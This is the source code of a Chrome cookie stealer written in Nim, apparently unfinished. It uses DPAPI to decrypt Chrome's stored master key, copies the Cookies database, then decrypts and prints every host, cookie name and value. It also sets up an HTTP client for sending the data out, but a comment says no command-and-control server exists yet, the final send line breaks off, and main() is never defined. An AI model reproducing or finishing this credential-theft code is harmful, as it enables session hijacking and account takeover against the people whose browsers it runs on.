import base64, json, tiny_sqlite
import nimcrypto/[rijndael, bcmode]
import winim/lean
import std/os
import winim/com
import httpclient

proc cryptUnprotectData(data: openarray[byte|char]): string =
  var
    input = DATA_BLOB(cbData: cint data.len, pbData: cast[ptr BYTE](unsafeaddr data[0]))
    output: DATA_BLOB
  
  if CryptUnprotectData(addr input, nil, nil, nil, nil, 0, addr output) != 0:
    result.setLen(output.cbData)
    if output.cbData != 0:
      copyMem(addr result[0], output.pbData, output.cbData)
    LocalFree(cast[HLOCAL](output.pbData))

proc cryptUnprotectData(data: string): string {.inline.} =
  result = cryptUnprotectData(data.toOpenArray(0, data.len - 1))

proc expandvars(path: string): string =
  var buffer = T(MAX_PATH)
  ExpandEnvironmentStrings(path, &buffer, MAX_PATH)
  result = $buffer

proc cookieDecrypt(data: openarray[byte]): string =
  # the key is stored in the Local State file
  # it's encrypted with DPAPI, so we'll use CryptUnprotectData to decrypt it

  # the first 3 bytes are the magic number "v10"
  # the next 12 bytes are the IV
  # the last 16 bytes are the tag
  # the rest is the encrypted data
  # we'll use AES-256-GCM to decrypt the data
  # the key is stored in the Local State file

  var key {.global.}: string
  
  # check if it's a v10 blob
  # if it is, decrypt it with AES-256-GCM
  # otherwise, decrypt it with CryptUnprotectData
  if data[0 ..< 3] == [byte 118, 49, 48]:
    # load the key from the local state if we haven't already
    # the key is stored in the Local State file
    
    if key.len == 0:
      let json = parseFile(expandvars(r"%LocalAppData%\Google\Chrome\User Data\Local State"))
      key = json["os_crypt"]["encrypted_key"].getStr().decode().substr(5).cryptUnprotectData()
    
    var
      ctx: GCM[aes256]
      aad: seq[byte]
      iv = data[3 ..< 3 + 12]
      encrypted = data[3 + 12 ..< data.len - 16]
      tag = data[data.len - 16 ..< data.len]
      dtag: array[aes256.sizeBlock, byte]
    
    # decrypt the blob
    if encrypted.len > 0:
      result.setLen(encrypted.len)
      ctx.init(key.toOpenArrayByte(0, key.len - 1), iv, aad)
      ctx.decrypt(encrypted, result.toOpenArrayByte(0, result.len - 1))
      ctx.getTag(dtag)
      assert(dtag == tag)
  else:
    result = cryptUnprotectData(data)


proc cryptChrome() =
  # if chrome is open, it will lock the database, so we'll make a copy
  let filename = r"%LocalAppData%\Google\Chrome\User Data\Default\Network\Cookies"
  copyFile(expandvars(filename), expandvars(filename & "_bak"))

  # load the database from disk
  let db = openDatabase(expandvars(filename & "_bak"))
  defer: db.close()

  # query with sqlite and decrypt
  for row in db.rows("SELECT host_key, name, encrypted_value FROM cookies"):
      echo "Host Name: ", row[0].fromDbValue(string)
      echo "Name: ", row[1].fromDbValue(string)
      echo "Value: ", cookieDecrypt(row[2].fromDbValue(seq[byte]))
      echo ""

  var client = newHttpClient()

  # oh fuck... we dont have a C2 yet.... May 1st 2024 11:07Pm lets see how long this takes
  echo client.

main()